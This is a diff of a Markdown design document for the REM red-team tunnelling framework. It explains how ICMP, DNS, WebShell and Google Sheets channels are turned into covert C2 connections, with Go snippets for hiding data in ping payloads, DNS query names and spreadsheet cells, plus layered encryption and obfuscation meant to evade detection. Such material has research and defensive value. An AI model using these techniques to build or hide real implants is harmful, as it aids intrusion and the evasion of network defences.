+Protocols like ICMP/DNS/HTTP are essentially unidirectional or asymmetric data exchanges. They need to be encapsulated into a unified `PacketConn` interface first, while converting unidirectional communication to bidirectional via a polling mechanism. This is the foundation of the entire conversion chain.
 
-The first transformation step wraps any form of data exchange as the unified PacketConn interface while solving unidirectional communication issues. This is the foundation of the entire transformation chain.
-
-net.PacketConn is an interface in Golang's standard library representing packet-oriented connections (similar to UDP), performing packet-level send/receive through ReadFrom/WriteTo methods. Each read/write is a complete packet, different from streaming net.Conn.
+`net.PacketConn` is the interface in the Golang standard library representing a packet-oriented connection (similar to UDP). It uses `ReadFrom`/`WriteTo` methods for packet-level sending and receiving. Each read/write is a complete data packet, unlike the stream-based `net.Conn`.
 
 **PacketConn Interface Definition:**
 
+
 ```go
-// net.PacketConn interface in Golang standard library
+// Golang standard library net.PacketConn interface
 type PacketConn interface {
-    ReadFrom(p []byte) (n int, addr net.Addr, err error)   // Read packet
-    WriteTo(p []byte, addr net.Addr) (n int, err error)    // Send packet
-    Close() error                                           // Close connection
-    // ... plus address, timeout helper methods
+    ReadFrom(p []byte) (n int, addr net.Addr, err error)   // Read data packet
+    WriteTo(p []byte, addr net.Addr) (n int, err error)    // Send data packet
+    Close() error                                          // Close connection
+    // ... plus auxiliary methods like address, timeout, etc.
 }
 ```
 
-**Difference from net.Conn**:
+**Difference from `net.Conn`:**
 
-- **net.Conn**: Stream connection, data transmitted as byte stream, with boundary concept (like TCP)
-- **net.PacketConn**: Packet connection, each read/write is complete packet, unordered and possibly lost (like UDP)
+- **net.Conn:** Stream connection; data is transmitted as a byte stream with boundary concepts (e.g., TCP).
+- **net.PacketConn:** Packet connection; each read/write is a complete packet, unordered and liable to be lost (e.g., UDP).
+    
 
-**Wrapping Methods for Various Protocols:**
+**Encapsulation Methods for Various Protocols:**
 
-- **ICMP packets**: Directly use ping packet send/receive as PacketConn data exchange
-- **HTTP API calls**: Simulate PacketConn communication through HTTP request sending and response receiving
-- **Webshell command execution**: Simulate PacketConn communication through command execution input and echo output
-- **DNS queries**: Simulate PacketConn communication through DNS query requests and responses
-- **Social media APIs**: Simulate PacketConn communication through data exchange via comments, posts, etc. APIs
+- **ICMP Packet:** Uses the sending/receiving of ping packets as `PacketConn` data exchange.
+- **HTTP API Call:** Simulates `PacketConn` communication via sending HTTP requests and receiving responses.
+- **WebShell Command Execution:** Simulates `PacketConn` communication via command input and echo output.
+- **DNS Query:** Simulates `PacketConn` communication via DNS query requests and responses.
+- **Social Media API:** Simulates `PacketConn` communication via data exchange in comments, posts, etc.
+    
 
-**Simplex Interface Abstraction:**
+Simplex Interface Abstraction:
 
-After providing an intermediate layer wrapping arbitrary data exchange protocols as PacketConn, we still need to transform PacketConn through some conversion into a streaming duplex channel, not just individual packets. **The upper limit of individual packets is C2's heartbeat channel**.
+After providing the intermediate layer to encapsulate arbitrary data exchange protocols as PacketConn, we need to transform PacketConn into a streamed duplex channel via some conversion, rather than just single data packets (where the limit of a single packet would just be a C2 heartbeat channel).
 
-We achieved transformation from **PacketConn** to **io.ReadWriteCloser** by adding Send/Receive and polling mechanism. Like what the tunnel layer did in Section 2.1.1, we perform a similar operation at the simplex layer, but with a different purpose. We aim to convert **PacketConn** to **io.ReadWriteCloser** through **polling**.
+We implemented the conversion from `PacketConn` to `io.ReadWriteCloser` by adding `Send`, `Receive`, and a `polling` mechanism. Just like the operation in the Tunnel layer in 2.1.1, we performed a similar operation in the Simplex layer, but with a different purpose: **Transforming PacketConn into `io.ReadWriteCloser` via polling.**
+
 
 ```go
-// Simplex interface: unified bidirectional data exchange abstraction
+// Simplex Interface: Unified Bidirectional Data Exchange Abstraction
 type Simplex interface {
     Send(pkts *SimplexPackets, addr *SimplexAddr) (n int, err error)
     Receive() (pkts *SimplexPacket, addr *SimplexAddr, err error)
@@ -304,40 +408,42 @@ type Simplex interface {
 }
 ```
 
-**Three Polling Modes:**
+Three Polling Modes:
 
-Simplex simulates duplex transmission through polling mechanism, selecting different polling strategies based on channel characteristics:
+Simplex simulates duplex transmission via polling mechanisms, choosing different strategies based on channel characteristics:
 
 **Mode 1: Client Polling (Most Common)**
 
-- **Applicable Scenarios**: HTTP API, WebShell, Google Sheets, and other channels allowing only client-initiated requests
-- **Working Principle**: Client periodically polls server to check for new data
-- **Typical Applications**:
-    - HTTP API: `GET /poll` periodically retrieves pending commands
-    - Google Sheets: Client periodically reads column A cells for commands
-    - WebShell: Client periodically sends special requests to retrieve server-cached data
+- _Applicable Scenario:_ Channels where only the client can initiate requests (HTTP API, WebShell, Google Sheets).
+- _Mechanism:_ The client periodically polls the server to check for new data.
+- _Typical Applications:_
+    - HTTP API: `GET /poll` to periodically retrieve pending commands.
+    - Google Sheets: Client periodically reads Column A to get commands.
+    - WebShell: Client periodically sends special requests to retrieve data cached by the server.
 
 **Mode 2: Server Polling (Reverse Channel)**
 
-- **Applicable Scenarios**: Certain special channels allowing server to actively read client data
-- **Working Principle**: Server periodically checks shared storage locations, reading data written by client
-- **Typical Applications**:
-    - File sharing systems: Server monitors specific directories, reading files uploaded by client
-    - Message queues: Server subscribes to specific topics, receiving messages published by client
+- _Applicable Scenario:_ Certain special channels allow the server to actively read client data.
+- _Mechanism:_ The server periodically checks a shared storage location to read data written by the client.
+- _Typical Applications:_
+    - File Sharing System: Server monitors a specific directory and reads files uploaded by the client.
+    - Message Queue: Server subscribes to a specific topic and receives messages published by the client.
+        
 
 **Mode 3: Bidirectional Polling (Symmetric Channel)**
 
-- **Applicable Scenarios**: Neither side can actively push; can only exchange data through shared storage
-- **Working Principle**: Both client and server periodically poll shared storage, each reading data written by the other
-- **Typical Applications**:
-    - Google Sheets bidirectional: Client polls column A (command input), server polls column B (command output)
-    - Cloud storage channel: Both sides monitor their designated file or object storage locations
+- _Applicable Scenario:_ Neither side can actively push; data exchange is only possible via shared storage.
+- _Mechanism:_ Both client and server periodically poll shared storage to read data written by the other party.
+- _TypicalApplications:_
+    - Google Sheets Bidirectional: Client polls Column A (Command Input), Server polls Column B (Command Output).
+    - Cloud Storage Channel: Both sides monitor specified files or object storage locations.
+        
 
-Through the Simplex interface, any data exchange medium (whether unidirectional, bidirectional, symmetric, or asymmetric) is uniformly wrapped as the PacketConn interface, providing standardized input for the next ARQ reliability transformation.
+Through the `Simplex` interface, any data exchange medium (unidirectional, bidirectional, symmetric, asymmetric) is encapsulated into a unified `PacketConn` interface, providing standardized input for the next step of ARQ reliability conversion.
 
-**Case 1: ICMP Covert Channel Implementation Details**
+Case 1: ICMP Covert Channel Implementation Details
 
-The core value of the ICMP protocol lies in bypassing firewall restrictions. Traditional firewalls typically allow ICMP Echo (ping) traffic through. REM exploits this characteristic by hiding attack data in ICMP packet payloads:
+The core value of the ICMP protocol lies in bypassing firewall restrictions. Traditional firewalls usually allow ICMP Echo (ping) traffic to pass. REM utilizes this feature to hide attack data in the payload of ICMP packets:
 
 ```go
 func (c *icmpConn) WriteTo(p []byte, addr net.Addr) (n int, err error) {
@@ -345,8 +451,8 @@ func (c *icmpConn) WriteTo(p []byte, addr net.Addr) (n int, err error) {
     m := &icmp.Message{
         Type: msgType,  // ICMP Echo Request/Reply
         Body: &icmp.Echo{
-            ID: remoteID,    // Session identifier
-            Seq: int(seq),   // Sequence number
+            ID: remoteID,    // Session ID
+            Seq: int(seq),   // Sequence Number
             Data: data,      // Attack data hidden here
         },
     }
@@ -362,24 +468,25 @@ func (c *icmpConn) WriteTo(p []byte, addr net.Addr) (n int, err error) {
 }
 ```
 
-Key technical points:
+_Key Technical Points:_
 
-- **Raw sockets**: Use golang.org/x/net/icmp to directly construct ICMP packets, bypassing OS ICMP processing
-- **Sequence number management**: Identify different packets through Seq field, supporting concurrent transmission
-- **Session isolation**: Distinguish different sessions through ID field, supporting multiple connections multiplexing same ICMP channel
+- **Raw Socket:** Uses `golang.org/x/net/icmp` to construct ICMP packets directly, bypassing OS ICMP processing.
+- **Sequence Management:** Uses the `Seq` field to identify different packets, supporting concurrent transmission.
+- **Session Isolation:** Uses the `ID` field to distinguish different sessions, supporting multiple connections reusing the same ICMP channel.
+    
 
-**Case 2: DNS Covert Channel Implementation Details**
+Case 2: DNS Covert Channel Implementation Details
 
-DNS protocol has higher stealth value—even in strict network environments, DNS traffic is rarely blocked. REM implements bidirectional data transmission through DNS queries and responses:
+The covert value of the DNS protocol is even higher—DNS traffic is rarely blocked even in strict network environments. REM achieves bidirectional data transmission through DNS queries and responses:
 
 ```go
-// Send data: Encode data into DNS query domain name
+// Send data: Encode data into the domain name of the DNS query
 func (c *dnsClient) Send(pkts *SimplexPackets, addr *SimplexAddr) (n int, err error) {
-    // Base58 encoding to avoid unsupported DNS characters
+    // Base58 encoding to avoid characters not supported by DNS
     encoded := base58.Encode(data)
 
-    // DNS label length limited to 63 bytes, needs segmentation
-    // Complete domain name limited to 253 bytes
+    // DNS label length limit is 63 bytes, segmentation required
+    // Full domain name limit is 253 bytes
     labels := splitToLabels(encoded, 63)
 
     // Construct DNS query: data1.data2.data3.yourdomain.com
@@ -391,7 +498,7 @@ func (c *dnsClient) Send(pkts *SimplexPackets, addr *SimplexAddr) (n int, err er
     return c.client.Exchange(msg, c.server)
 }
 
-// Receive data: Extract data from DNS response TXT records
+// Receive data: Extract data from the TXT record of the DNS response
 func (c *dnsServer) Receive() (pkts *SimplexPacket, addr *SimplexAddr, err error) {
     // Parse DNS query
     msg := parseDNSQuery()
@@ -400,36 +507,38 @@ func (c *dnsServer) Receive() (pkts *SimplexPacket, addr *SimplexAddr, err error
     labels := strings.Split(msg.Question[0].Name, ".")
     encoded := strings.Join(labels[:len(labels)-2], "")
 
-    // Base58 decode to get original data
+    // Base58 decode to get raw data
     data := base58.Decode(encoded)
 
     return &SimplexPacket{Data: data}, addr, nil
 }
 ```
 
-Key techniques for DNS channel:
+_DNS Channel Key Technologies:_
 
-- **Base58 encoding**: Avoids special characters unsupported by DNS, shorter than Base64
-- **Label segmentation**: DNS labels limited to 63 bytes, complete domain limited to 253 bytes, requires intelligent segmentation
-- **TXT records**: Server response uses TXT records to transmit data, single record maximum 255 bytes
-- **Query aggregation**: Multiple small packets can be merged into one DNS query for efficiency
+- **Base58 Encoding:** Avoids special characters unsupported by DNS and is shorter than Base64.
+- **Label Segmentation:** DNS labels are limited to 63 bytes, full domains to 253 bytes; smart segmentation is required.
+- **TXT Records:** Server responses use TXT records to transmit data (max 255 bytes per record).
+- **Query Aggregation:** Multiple small packets can be merged into a single DNS query to improve efficiency.
+    
 
-**Case 3: Google Sheets Covert Channel Implementation Details**
+Case 3: Google Sheets Covert Channel Implementation Details
 
-Google Sheets is a widely used online collaboration tool. By using the Google Sheets API, spreadsheet cells become data exchange media, with traffic completely hidden in legitimate office traffic:
+Google Sheets is a widely used online collaboration tool. By using Google Sheets API cells as a data exchange medium, traffic is completely hidden within legitimate office traffic:
+
 
 ```go
-// Google Sheets cell layout design
+// Google Sheets Cell Layout Design
 const (
-    sheetCommandCell = "A"  // Column A: Command input
-    sheetOutputCell  = "B"  // Column B: Command output
+    sheetCommandCell = "A"  // Column A: Command Input
+    sheetOutputCell  = "B"  // Column B: Command Output
     sheetTimestamp   = "C"  // Column C: Timestamp
-    sheetTickerCell  = "E2" // E2 cell: Polling interval configuration
+    sheetTickerCell  = "E2" // Cell E2: Polling Interval Configuration
 )
 
-// Client polling: Read commands from column A
+// Client Polling: Read command from Column A
 func (g *GoogleClient) pullCommand(rowIndex int) (string, error) {
-    // Read command from specified row in column A
+    // Read command from specified row in Column A
     readRange := fmt.Sprintf("%s!%s%d", sheetName, sheetCommandCell, rowIndex)
 
     url := fmt.Sprintf(
@@ -442,9 +551,9 @@ func (g *GoogleClient) pullCommand(rowIndex int) (string, error) {
     return command, nil
 }
 
-// Client push: Write output to columns B-C
+// Client Push: Write output to Columns B-C
 func (g *GoogleClient) pushOutput(rowIndex int, output string) error {
-    // Write to columns B-C (output and timestamp)
+    // Write to Columns B-C (Output and Timestamp)
     writeRange := fmt.Sprintf("%s!%s%d:%s%d", sheetName,
         sheetOutputCell, rowIndex, sheetTimestamp, rowIndex)
 
@@ -466,13 +575,13 @@ func (g *GoogleClient) pushOutput(rowIndex int, output string) error {
 }
 ```
 
-**Google Sheets Channel Workflow**:
+_Google Sheets Channel Workflow:_
 
 ```
-Client(Implant)          Google Sheets          Server(C2 Server)
+Client (Implant)          Google Sheets          Server (C2 Server)
   |                          |                          |
-  |                          |<--[1. Write A2: "whoami"]--|
-  |--[2. Poll read A2]------>|                          |
+  |                          |<--[1. Write A2: "whoami"]|
+  |--[2. Poll Read A2]------>|                          |
   |<-[3. Return: "whoami"]---|                          |
   |                          |                          |
   |--[4. Write B2-C2]------->|                          |
@@ -481,55 +590,55 @@ Client(Implant)          Google Sheets          Server(C2 Server)
   |                          |                          |
 ```
 
-Google Sheets channel accesses spreadsheets through Service Account OAuth2 authentication, uses column separation for bidirectional communication (column A stores command input, columns B-C store output and timestamp), uses batchGet API to read multiple cell ranges at once to reduce request count. E2 cell stores dynamic polling interval configuration allowing remote adjustment of communication frequency. All operations use standard Sheets API exclusively, with traffic signatures indistinguishable from normal office operations.
+The Google Sheets channel uses Service Account OAuth2 authentication to access spreadsheets. It implements bidirectional communication via column separation (Column A for command input, Columns B-C for output and timestamps) and uses the `batchGet` API to read multiple cell ranges at once to reduce request count. Cell E2 stores dynamic polling interval configuration, allowing remote adjustment of communication frequency. All operations strictly use the standard Sheets API, making the traffic characteristics indistinguishable from normal office operations.
 
-Regardless of underlying protocol, all are wrapped as the same PacketConn interface and implement bidirectional communication capability through polling mechanism, providing standardized input for the upper ARQ protocol.
+Regardless of the underlying protocol, they are all encapsulated into the same `PacketConn` interface and achieve bidirectional communication capability via polling mechanisms, providing standardized input for the upper-layer ARQ protocol.
 
-**Simplex Interface and Duplexing Mechanism**
+Simplex Interface and Duplexing Mechanism:
 
-Many protocols (like HTTP API, WebShell, Google Sheets) are inherently unidirectional communication—only allowing client-initiated requests, with server unable to actively push data. The Simplex interface, through unified Send/Receive abstraction and flexible polling mechanism, transforms these unidirectional channels into bidirectional communication.
+Many protocols (like HTTP API, WebShell, Google Sheets) are inherently unidirectional—only the client can initiate requests; the server cannot actively push data. The Simplex interface converts these unidirectional channels into bidirectional communication via unified Send/Receive abstraction and flexible polling mechanisms.
 
-#### 2.2.2 ARQ: Reliability Guarantee and Interface Transformation from PacketConn to Conn
+#### 2.2.2 ARQ: Reliability Guarantee and Interface Conversion from PacketConn to Conn
 
-Simplex output PacketConn is bidirectional but unreliable, requiring ARQ protocol to provide retransmission, ordering guarantee, flow control, and other reliability mechanisms, ultimately converting to net.Conn interface for Tunnel use.
+The `PacketConn` output by Simplex is bidirectional but unreliable. It requires an ARQ (Automatic Repeat reQuest) protocol to provide retransmission, ordering guarantees, and flow control mechanisms, finally converting it to a `net.Conn` interface for delivery to the Tunnel.
 
-Traditional ARQ protocols (like KCP) are tightly coupled with specific transport protocols, limiting application scenarios. REM achieves ARQ protocol decoupling through PacketConn abstraction, allowing any ARQ implementation to work on arbitrary PacketConn.
+Traditional ARQ protocols (like KCP) are strongly coupled with specific transport protocols, limiting application scenarios. REM implements the decoupling of ARQ protocols via `PacketConn` abstraction, allowing any ARQ implementation to work on any `PacketConn`.
 
-**ARQ and PacketConn Decoupling Design**:
+**Decoupled Design of ARQ and PacketConn:**
 
 ```go
-// ARQ protocol decoupling from PacketConn
+// Decoupling ARQ Protocol from PacketConn
 func NewARQSession(pc PacketConn) net.Conn {
-    // ARQ protocol no longer cares if underlying is UDP, ICMP, or DNS
-    // Only performs packet send/receive through PacketConn interface
-    // Ultimately outputs standard net.Conn interface
+    // The ARQ protocol no longer cares if the underlying layer is UDP, ICMP, or DNS
+    // It only sends/receives packets via the PacketConn interface
+    // Finally outputs a standard net.Conn interface
 }
 ```
 
-- Any protocol implementing PacketConn interface (UDP, ICMP, DNS, HTTP, etc.) can serve as ARQ transport layer
-- ARQ protocol can evolve independently, unrestricted by underlying transport protocol
-- Achieves complete decoupling between reliable transmission protocol and underlying transport medium
+- Any protocol implementing the `PacketConn` interface (UDP, ICMP, DNS, HTTP, etc.) can serve as the transport layer for ARQ.
+- The ARQ protocol can evolve independently, unrestricted by the underlying transport protocol.
+- Achieves complete decoupling of the reliable transport protocol from the underlying transport medium.
 
-**Multiple ARQ Protocols for On-Demand Selection**:
+Selectable Multi-ARQ Protocols:
 
-REM supports arbitrary ARQ protocol implementations, flexibly selecting based on scenario requirements. We provide two ARQ protocols by default:
+REM supports arbitrary ARQ protocol implementations, selectable based on scenario requirements. We provide two default ARQ protocols:
 
-1. **KCP Protocol**: Mature ARQ implementation providing fast retransmission and congestion control, suitable for low-latency scenarios
-2. **Custom ARQ**: Lightweight implementation supporting NACK mechanism and adaptive parameter adjustment, suitable for restricted low-rate environments
+- **KCP Protocol:** Mature ARQ implementation providing fast retransmission and congestion control, suitable for low-latency scenarios.
+- **Custom ARQ:** Lightweight implementation supporting NACK mechanisms and adaptive parameter adjustment, suitable for low-rate restricted environments.
+    
 
-By decoupling ARQ from PacketConn association, users can select the most suitable ARQ protocol based on network environment (latency, packet loss rate, bandwidth), even implementing custom ARQ algorithms.
+By decoupling the association between ARQ and `PacketConn`, users can choose the most suitable ARQ protocol based on network environments (latency, packet loss rate, bandwidth), or even implement custom ARQ algorithms.
 
-**Further Control of Statistical Signatures**:
+Further Control of Statistical Characteristics:
 
-The ARQ layer provides additional statistical countermeasure capabilities. By adjusting ARQ parameters (retransmission interval, window size, timeout, etc.), traffic's temporal characteristics and packet size distribution can be altered, making it harder to identify through statistical analysis. For example, randomizing retransmission delays and dynamically adjusting window sizes can break traditional ARQ protocols' predictable patterns.
+The ARQ layer provides additional capabilities for statistical countermeasures. By adjusting ARQ parameters (retransmission interval, window size, timeout duration, etc.), one can alter traffic timing characteristics and packet size distribution, making it harder for statistical analysis to identify. For instance, randomizing retransmission delays and dynamically adjusting window sizes can break the predictable patterns of traditional ARQ protocols.
 
-#### 2.2.3 Final Output: net.Conn with Equal Standing to TCP
+#### 2.2.3 Final Output: `net.Conn` with Equal Status to TCP
 
-After Simplex duplexing and ARQ reliability guarantees, originally inferior protocols finally output standard net.Conn interface, gaining capabilities and standing completely equal to TCP/UDP at the Tunnel layer.
+After Simplex duplexing and ARQ reliability guarantees, the originally inferior protocols are finally output as standard `net.Conn` interfaces, gaining the exact same status and capabilities as TCP/UDP at the Tunnel level.
 
-After these transformations, originally inferior protocols finally output as standard net.Conn interface, possessing capabilities completely equal to TCP/UDP.
+**Capabilities of Standard `net.Conn`:**
 
-**Capabilities of Standard net.Conn:**
 
 ```go
 type Conn interface {
@@ -539,120 +648,152 @@ type Conn interface {
 }
 ```
 
-**Complete Transformation Chain:**
+**Complete Conversion Link:**
+
+Plaintext
 
 ```
-Inferior Protocols (ICMP/HTTP/WebShell/DNS/lolc2)
-    ↓ [Simplex: Wrap as PacketConn + Duplexing]
-Bidirectional PacketConn (stateless packet interface)
-    ↓ [ARQ: Reliability guarantee + interface transformation]
+Inferior Protocol (ICMP/HTTP/WebShell/DNS/lolc2)
+    ↓ [Simplex: Encapsulate as PacketConn + Duplexing]
+Bidirectional PacketConn (Stateless Packet Interface)
+    ↓ [ARQ: Reliability Guarantee + Interface Conversion]
 Standard net.Conn
-    ↓ [Deliver to Section 2.1 Tunnel]
-Equal standing with TCP/UDP
+    ↓ [Delivered to Tunnel in Section 2.1]
+Equal Status to TCP/UDP
 ```
 
-Through this transformation mechanism, REM achieves true protocol equality:
+Through this conversion mechanism, REM achieves true protocol equality:
 
-- **Completely airgapped**: Establish reliable connection through webshell, supporting proxy, tunnel, forwarding
-- **HTTP-only allowed**: Establish complete TCP connection through HTTP API, supporting any upper-layer protocol
-- **DNS-only allowed**: Establish covert tunnel through DNS queries, supporting data transmission
-- **Whitelist IP/domain only**: Establish reliable connection through lolc2
-- .....
+- **Completely Isolated:** Establish a reliable connection via WebShell, supporting proxying, tunneling, and forwarding.
+    
+- **HTTP Only:** Establish a full TCP connection via HTTP API, supporting any upper-layer protocol.
+    
+- **DNS Only:** Establish a covert tunnel via DNS queries, supporting data transmission.
+    
+- **Allowlist IP/Domain Only:** Establish a reliable connection via `lolc2`.
+    
+- ...and so on.
+    
 
-_(In OSI model terms, this involves physical layer raw packet construction, data link layer frame encapsulation, and transport layer reliability guarantee mechanisms)_
+_(In the OSI model, this involves raw packet construction at the physical layer, data frame encapsulation at the data link layer, and reliability guarantee mechanisms at the transport layer.)_
 
-Through designs in Sections 2.1 and 2.2, we've achieved **building full-duplex communication transport layer from any arbitrary data exchange**. **Is this the end?**
+We have achieved a transport layer capable of full-duplex communication using arbitrary data exchange through the designs in 2.1 and 2.2. But does it end here?
 
-### 2.3 Above Transport Layer: Inverted Session and Presentation Layers
+### 2.3 Above the Transport Layer: Inverted Session and Presentation Layers
 
-Traditional OSI model's "multiplex-then-encrypt" approach exposes internal communication structure. REM achieves complete data control through inverted architecture (encrypt-then-multiplex), where data above the transport layer first undergoes Wrapper encryption/obfuscation, then Mux multiplexing.
+Traditional OSI models multiplex first and then encrypt, which exposes internal communication structural characteristics. REM implements complete control over data through an **Inverted Architecture (Encrypt First, Then Multiplex)**. Data is first encrypted and obfuscated by the Wrapper above the transport layer, and then multiplexed by the Mux.
 
-In the traditional OSI model, session and presentation layers are independent functional layers. REM architecture fuses these layers, creating more powerful attack capability combinations.
+In the traditional OSI model, the session layer and presentation layer are independent functional layers. The REM architecture fuses these layers to create a more powerful combination of attack capabilities.
 
-#### 2.3.1 Inverted Architecture: Achieving Complete Data Control
+#### 2.3.1 Inverted Architecture: Achieving Total Data Control
 
-Multiplexing before encryption allows detection devices to see internal multiplexing structural signatures. Inverting to encrypt-then-multiplex ensures detection devices only see encrypted single data streams.
+Multiplexing before encryption allows detection devices to see the structural features of internal multiplexing. Inverting to "Encrypt then Multiplex" ensures that detection devices can only see a single encrypted data stream.
 
-The core goal of REM's inverted architecture is **complete control over data**. By placing the session layer above the presentation layer, data must first undergo encryption/obfuscation processing before reaching the application layer, then connection multiplexing management.
+The core goal of the REM inverted architecture is total control over data. By placing the session layer above the presentation layer, data must undergo encryption and obfuscation processing before reaching the application layer, followed by connection multiplexing management.
 
-**Complete Data Flow Control**
+**Total Control of Data Flow**
 
-[Mermaid diagram showing Traditional OSI Architecture vs REM Inverted Architecture]
-
-The core value of this inverted design:
-
-1. **Encrypt first, multiplex later**: Data above transport layer first undergoes complete encryption/obfuscation, then multiplexing
-2. **Completely controllable data flow**: Attackers complete all necessary data processing before data reaches target application
-3. **Hide internal structure**: Detection devices cannot see internal multiplexing structure, only encrypted data streams
-
-#### 2.3.2 Presentation Layer (Wrapper): Dynamic Encryption/Obfuscation Chain
-
-Single encryption algorithms are easily identified; multiple nested encryption and obfuscation are needed. Wrapper achieves arbitrary combination of encryption/obfuscation through chained processing architecture and reverse read chain design, while ensuring correct encryption/decryption order.
-
-Code: [https://github.com/chainreactors/rem-community/tree/master/protocol/wrapper](https://github.com/chainreactors/rem-community/tree/master/protocol/wrapper)
-
-**Wrapper Chained Processing Architecture**
-
-REM's Wrapper layer adopts chained processing architecture based on standard io.ReadWriteCloser interface design, supporting streaming encryption and dynamic configuration mechanisms. Core components include WrapperChain processor chain and ChainReader read chain, implementing layered data encryption processing.
-
-**Reverse Read Chain Design**
-
-To ensure correct decryption order, the read chain uses reverse construction: data writes start from first wrapper (encryption order), data reads start from last wrapper (decryption order), ensuring nested encryption correctness.
-
-Assuming three wrapper layers configured: AES-CFB → XOR → HTTP camouflage
-
-Write data flow:
+**REM Inverted Architecture:**
 
 ```
-Plaintext data
-  ↓ [AES-CFB encryption]
-AES ciphertext
-  ↓ [XOR obfuscation]
-XOR obfuscated data
-  ↓ [HTTP header wrapping]
-Camouflaged HTTP traffic
+Application Layer
+      ↓
+Transport Layer
+      ↓
+Presentation Layer (Wrapper Encryption/Obfuscation)
+      ↓
+Session Layer (Mux Multiplexing)
+```
+
+**Traditional OSI Architecture:**
+
+
+```
+Transport Layer
+      ↓
+Application Layer
+      ↓
+Presentation Layer
+      ↓
+Session Layer
+```
+
+The core value of this inverted design lies in:
+
+- **Encrypt First, Multiplex Later:** Data is first subjected to complete encryption and obfuscation above the transport layer, and then multiplexed.
+- **Fully Controllable Data Flow:** The attacker completes all necessary data processing before the data reaches the target application.
+- **Hiding Internal Structures:** Detection devices cannot see the internal structure of multiplexing, only the encrypted data stream.
+    
+
+#### 2.3.2 Presentation Layer (Wrapper): Dynamic Encryption and Obfuscation Chain
+
+_Code:_ [`https://github.com/chainreactors/rem-community/tree/master/protocol/wrapper`](https://www.google.com/search?q=%5Bhttps://github.com/chainreactors/rem-community/tree/master/protocol/wrapper%5D\(https://github.com/chainreactors/rem-community/tree/master/protocol/wrapper\))
+
+Single encryption algorithms are easily identified; multi-layer nested encryption and obfuscation are required. The Wrapper implements arbitrary combinations of encryption and obfuscation via a chained processing architecture and a reverse read chain design, while ensuring the correctness of the encryption/decryption order.
+
+Wrapper Chain Processing Architecture:
+
+REM's Wrapper layer adopts a chained processing architecture designed based on the standard io.ReadWriteCloser interface, supporting stream encryption and dynamic configuration mechanisms. Core components include the WrapperChain processor chain and ChainReader read chain, realizing layered data encryption processing.
+
+Reverse Read Chain Design:
+
+To ensure correct decryption order, the read chain is built in reverse: when writing data, it starts from the first wrapper (encryption order); when reading data, it starts from the last wrapper (decryption order), ensuring the correctness of nested encryption.
+
+**Assumption: Three layers of wrappers are configured: AES-CFB → XOR → HTTP Masquerade**
+
+**Write Data Flow:**
+
+```
+Plaintext Data
+  ↓ [AES-CFB Encryption]
+AES Ciphertext
+  ↓ [XOR Obfuscation]
+XOR Obfuscated Data
+  ↓ [HTTP Header Wrapping]
+Masqueraded HTTP Traffic
   ↓
-Network transmission
+Network Transmission
 ```
 
-Read data flow (reverse):
+**Read Data Flow (Reverse):**
 
 ```
-Network reception
-  ↓ [HTTP header stripping]
-XOR obfuscated data
-  ↓ [XOR de-obfuscation]
-AES ciphertext
-  ↓ [AES-CFB decryption]
-Plaintext data
+Network Receive
+  ↓ [HTTP Header Stripping]
+XOR Obfuscated Data
+  ↓ [XOR De-obfuscation]
+AES Ciphertext
+  ↓ [AES-CFB Decryption]
+Plaintext Data
 ```
 
-This reverse read design supports arbitrary number and type of wrapper dynamic combinations, ensuring "outer wraps inner" correct encryption/decryption order while maintaining completely transparent standard `io.ReadWriteCloser` interface for upper-layer calls. It allows attackers to flexibly combine different encryption/obfuscation techniques according to specific needs, implementing customizable traffic camouflage, providing multi-level data protection.
+This reverse read design supports dynamic combination of any number and type of wrappers. It ensures the correct encryption/decryption order of "outer layers wrapping inner layers" while maintaining a completely transparent standard `io.ReadWriteCloser` interface for upper-layer calls. This allows attackers to flexibly combine different encryption and obfuscation technologies based on specific needs, achieving customizable traffic camouflage and providing multi-level protection for data.
 
 #### 2.3.3 Session Layer (Mux): Lightweight Multiplexing
 
-Existing protocols like smux/yamux have identifiable statistical signatures. REM implements zero-signature multiplexing through custom protobuf message format and Redirect mechanism, avoiding detection device identification.
+Existing protocols like `smux`/`yamux` have identifiable statistical characteristics. REM avoids identification by detection devices through custom protobuf message formats and a Redirect mechanism to achieve zero-signature multiplexing.
 
-REM uses protobuf to define message format, combined with buffer management mechanism, implementing its own multiplexer. It avoids statistical signatures of existing multiplexing protocols like smux/yamux, while providing capabilities like zero-signature design, adaptive buffering, intelligent scheduling, and error recovery.
+REM uses protobuf to define message formats and implements its own multiplexer in conjunction with a buffer management mechanism. This avoids the statistical characteristics of existing multiplexing protocols like `smux`/`yamux` while providing zero-signature design, adaptive buffering, smart scheduling, and error recovery capabilities.
 
-_(In OSI model terms, this corresponds to session layer connection management and presentation layer encryption/obfuscation. REM inverts and fuses both to achieve complete data control)_
+_(In the OSI model, this corresponds to session layer connection management and presentation layer encryption/obfuscation. REM inverts and fuses the two to achieve complete control over data.)_
 
-### 2.4 Between Transport Layers: Protocol-Boundaryless Proxy Integration
+### 2.4 Between Transport Layers: Protocol-Boundary-Free Proxy Integration
 
-Attack scenarios often require traversing multiple network layers (firewalls/enterprise proxies/WebShells). proxyclient integrates various proxy protocols (SOCKS/HTTP/SSH/neoreg/suo5) as composable modules through unified Dialer abstraction and dynamic registration mechanism, achieving protocol-boundaryless proxy capabilities.
+Attack scenarios often require traversing multiple network layers (firewalls/enterprise proxies/WebShells). `proxyclient` integrates various proxy protocols (SOCKS/HTTP/SSH/neoreg/suo5) into combinable modular components via unified `Dialer` abstraction and dynamic registration mechanisms, achieving protocol-boundary-free proxy capabilities.
 
-Code: [https://github.com/chainreactors/proxyclient](https://github.com/chainreactors/proxyclient)
+_Code:_ [`https://github.com/chainreactors/proxyclient`](https://www.google.com/search?q=%5Bhttps://github.com/chainreactors/proxyclient%5D\(https://github.com/chainreactors/proxyclient\))
 
-REM architecture achieves protocol-boundaryless capabilities through inter-transport-layer proxy integration. The core is the proxyclient library, which effectively blurs boundaries between data transmission and proxying, unifying traditionally isolated proxy protocols as composable modular components.
+The REM architecture achieves protocol-boundary-free capabilities through proxy integration between transport layers. The core of this part is the `proxyclient` library, which effectively blurs the boundaries between data transmission and proxies, unifying traditionally isolated proxy protocols into modular components.
 
-_(proxyclient was originally a sub-package in REM, but its application scenarios far exceed REM, so we abstracted it from REM as a lightweight, dependency-free independent package)_
+_(`proxyclient` was originally a sub-package in REM, but its application scenarios far exceed REM, so it was abstracted as a lightweight, dependency-free independent package.)_
 
-#### 2.4.1 Golang Proxy Background Knowledge
+#### 2.4.1 Background Knowledge of Golang Proxies
 
-Traditional Golang proxies have fundamental cognitive biases. Most developers use:
+There is a fundamental cognitive bias regarding traditional Golang proxies. Most developers use:
+
 
 ```go
-// Wrong proxy usage - only for HTTP
